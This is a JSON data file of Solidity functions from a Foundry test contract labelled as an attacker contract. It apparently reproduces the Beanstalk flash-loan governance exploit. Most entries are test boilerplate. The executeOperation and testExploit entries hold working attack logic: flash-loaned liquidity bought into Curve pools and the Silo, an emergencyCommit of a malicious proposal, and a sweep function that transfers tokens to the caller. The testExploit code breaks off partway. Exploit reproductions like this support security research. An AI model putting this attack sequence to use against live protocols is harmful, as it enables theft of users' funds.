[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "executeOperation",
    "original_code": "    function executeOperation(\n        address[] calldata assets,\n        uint256[] calldata amounts,\n        uint256[] calldata premiums,\n        address initiator,\n        bytes calldata params\n    ) external returns (bool) {\n        emit log_named_uint(\"After deposit, Bean balance of attacker:\", bean.balanceOf(address(this)) / 1e6); // @note redundant log\n        uint256[3] memory tempAmounts;\n        tempAmounts[0] = amounts[0];\n        tempAmounts[1] = amounts[1];\n        tempAmounts[2] = amounts[2];\n        threeCrvPool.add_liquidity(tempAmounts, 0);\n        uint256[2] memory tempAmounts2;\n        tempAmounts2[0] = 0;\n        tempAmounts2[1] = threeCrv.balanceOf(address(this));\n        bean3Crv_f.add_liquidity(tempAmounts2, 0);\n        emit log_named_uint(\n            \"After adding 3crv liquidity , bean3Crv_f balance of attacker:\", crvbean.balanceOf(address(this))\n        );\n        emit log_named_uint(\n            \"After Curvebean3Crv_f balance of attacker:\", IERC20(address(bean3Crv_f)).balanceOf(address(this))\n        ); //@note logging balance for same token ?\n        siloV2Facet.deposit(address(bean3Crv_f), IERC20(address(bean3Crv_f)).balanceOf(address(this)));\n        //beanstalkgov.vote(bip); --> this line not needed, as beanstalkgov.propose() already votes for our bip\n        beanstalkgov.emergencyCommit(bip);\n        emit log_named_uint(\n            \"After calling beanstalkgov.emergencyCommit() , bean3Crv_f balance of attacker:\",\n            crvbean.balanceOf(address(this))\n        );\n        bean3Crv_f.remove_liquidity_one_coin(IERC20(address(bean3Crv_f)).balanceOf(address(this)), 1, 0);\n        emit log_named_uint(\n            \"After removing liquidity from crvbean pool , bean3Crv_f balance of attacker:\",\n            crvbean.balanceOf(address(this))\n        );\n        tempAmounts[0] = amounts[0] + premiums[0];\n        tempAmounts[1] = amounts[1] + premiums[1];\n        tempAmounts[2] = amounts[2] + premiums[2];\n        emit log_named_uint(\"premiums[0]:\", premiums[0]);\n        emit log_named_uint(\"premiums[1]:\", premiums[1]);\n        emit log_named_uint(\"premiums[2]:\", premiums[2]);\n        emit log_named_uint(\"tempAmounts[0]:\", tempAmounts[0]);\n        emit log_named_uint(\"tempAmounts[1]:\", tempAmounts[1]);\n        emit log_named_uint(\"tempAmounts[2]:\", tempAmounts[2]);\n\n        threeCrvPool.remove_liquidity_imbalance(tempAmounts, type(uint256).max);\n        threeCrvPool.remove_liquidity_one_coin(threeCrv.balanceOf(address(this)), 1, 0);\n\n        emit log_named_uint(\n            \"After removing 3crv liquidity from 3crv pool, usdc balance of attacker:\", usdc.balanceOf(address(this))\n        );\n\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "sweep",
    "original_code": "    function sweep() external {\n        IERC20 erc20bean3Crv_f = IERC20(0x3a70DfA7d2262988064A2D051dd47521E43c9BdD);\n        erc20bean3Crv_f.transfer(msg.sender, erc20bean3Crv_f.balanceOf(address(this))); //Just for verification, so keep other tokens\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        address[] memory path = new address[](2);\n        path[0] = uniswapv2.WETH();\n        path[1] = address(bean);\n        uniswapv2.swapExactETHForTokens{value: 75 ether}(0, path, address(this), block.timestamp + 120);\n        emit log_named_uint(\"Initial USDC balancer of attacker\", usdc.balanceOf(address(this)));\n\n        emit log_named_uint(\n            \"After initial ETH -> BEAN swap, Bean balance of attacker:\", bean.balanceOf(address(this)) / 1e6\n        );\n        bean.approve(address(siloV2Facet), type(uint256).max);\n        siloV2Facet.depositBeans(bean.balanceOf(address(this)));\n        emit log_named_uint(\n            \"After BEAN deposit to SiloV2Facet, Bean balance of attacker:\", bean.balanceOf(address(this)) / 1e6\n        );\n        IBeanStalk.FacetCut[] memory _diamondCut = new IBeanStalk.FacetCut[](0);\n        bytes memory data = abi.encodeWithSelector(ContractTest.sweep.selector);\n        //emit log_named_uint(\"BIP:\", bip);\n",
    "description": ""
  }
]